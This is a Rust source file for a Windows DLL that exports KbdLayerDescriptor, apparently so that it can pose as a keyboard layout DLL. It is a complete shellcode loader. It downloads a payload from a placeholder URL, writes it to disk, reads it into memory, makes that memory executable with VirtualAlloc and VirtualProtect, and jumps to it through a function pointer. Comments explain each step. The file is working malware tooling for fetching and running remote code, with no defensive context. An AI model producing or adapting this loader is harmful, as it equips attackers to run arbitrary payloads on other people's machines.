use windows::Win32::UI::WindowsAndMessaging::{MessageBoxA, MB_OK};
use windows::core::s;
use reqwest::blocking;
use std::fs::{File, OpenOptions};
use std::{io, io::Read};
use windows::Win32::System::Memory::*;

#[unsafe(no_mangle)]
#[allow(non_snake_case)]
pub extern "system" fn KbdLayerDescriptor()
{
    let mut _file = match download() // Call the download function and match on the result
    {
        Ok(file) => file, // If the download was successful, return the file handle
        Err(e) => {
            std::process::exit(1);
        }
    };

    let mut _shellcode = match bin_to_byte(_file) // Call the bin_to_byte function and match on the result
    {
        Ok(shellcode) => shellcode, // If the conversion was successful, return the shellcode as a byte array
        Err(e) => {
            std::process::exit(1);
        }
    };

    println!("Shellcode downloaded and converted successfully. Length: {} bytes", _shellcode.len());

    load(_shellcode); // Call the load function to execute the shellcode
}

fn download() -> Result<File, Box<dyn std::error::Error>> // Return a nothing on success or any type of error on failure. Box puts the error on the heap for a predictable size. dyn is for dynamic as the error is unknown at complie time.
{
    unsafe{MessageBoxA(None, s!("Downloading shellcode"), s!("Info"), MB_OK)}; // Show a message box to indicate that the download is starting.
    // Use reqwest to download to get the shell code
    let mut _url_grab = match blocking::get("URL")
    {
        Ok(response) => response, // If the request was successful, return the response
        Err(e) => {
            std::process::exit(1);
        }
    };

    // Create a file to save the shellcode to
    let mut _path = File::create("file")?;

    io::copy(&mut _url_grab, &mut _path); // Copy the contents of the url to the file. The ? operator will return an error if it occurs, othewise it will continue.
    
    Ok(_path) // Return the file handle on success
}

// Turn the downloaded shellcode into a byte array that can be executed in memory.
fn bin_to_byte(_file: File) -> Result<Vec<u8>, Box<dyn std::error::Error>> { // returns a vector of 8 bit unsigned integers
   
   // Due to permissions issues, the file needs to be opened and have read and write set to true. Create shouldn't be needed but I set it just in case
    let _file = OpenOptions::new()
        .read(true)
        .write(true)
        .open("file")?; // Open the file for reading. The ? operator will return an error if it occurs, otherwise it will continue.   
   
    // create a buffer to hold the contents. This is a vector of 8 bit unsigned integers, which is the same as a byte array. The buffer will be filled with the contents of the file.
    let mut buffer = Vec::new();

    // Use a buffered reader to read the file into the buffer. This is more efficient than reading the file byte by byte.
    io::BufReader::new(_file).read_to_end(&mut buffer)?;

    // Return the buffer on success
    Ok(buffer)
}

// load the shellcode into memory and execute it.
fn load(shellcode: Vec<u8>)
{
    // Open an unsafe block to call the Windows API functions. This is necessary because the functions are not safe to call and can cause undefined behavior if used incorrectly.
    unsafe {
        // std::ptr::null_mut() is used to get a null pointer, effectively telling virtual alloc to choose the address. The some is a wrapper from the windows crate to convert the raw pointer into an option type. This is done to prevent null pointer dereferences.
        // Allocate
        let mut _ptr = VirtualAlloc(Some(std::ptr::null_mut()), shellcode.len(), MEM_COMMIT, PAGE_READWRITE);
        if _ptr.is_null() {
            eprintln!("VirtualAlloc failed");
            std::process::exit(1);
        }
        
        // Copy the shellcode into the allocated memory. The copy_nonoverlapping function is used to copy the bytes from the shellcode vector to the allocated memory. The as_ptr() method is used to get a pointer to the first byte of the shellcode vector, and the ptr variable is cast to a mutable pointer to u8. The length of the shellcode is also passed to ensure that the correct number of bytes are copied.
        // Copy
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), _ptr as *mut u8, shellcode.len());

        let mut old_protect = PAGE_PROTECTION_FLAGS(0); // Create a variable to hold the old protection flags. This is necessary because VirtualProtect will change the protection flags of the allocated memory, and we need to restore them after executing the shellcode.

        VirtualProtect(_ptr.cast::<std::ffi::c_void>(), shellcode.len(), PAGE_EXECUTE_READ, &mut old_protect); // Change the memory protection to execute read. This is necessary to execute the shellcode. The same address is passed to change the protection of the allocated memory. The length and protection flags are also passed.

        // Create a function pointer to the allocated memory and call it. The transmute function is used to convert the raw pointer to a function pointer. The extern "C" fn() type is used to specify that the function has no parameters and returns nothing. The function is then called, which will execute the shellcode.
        // Execute
        let func: extern "C" fn() = std::mem::transmute(_ptr);
        func();
    }
}
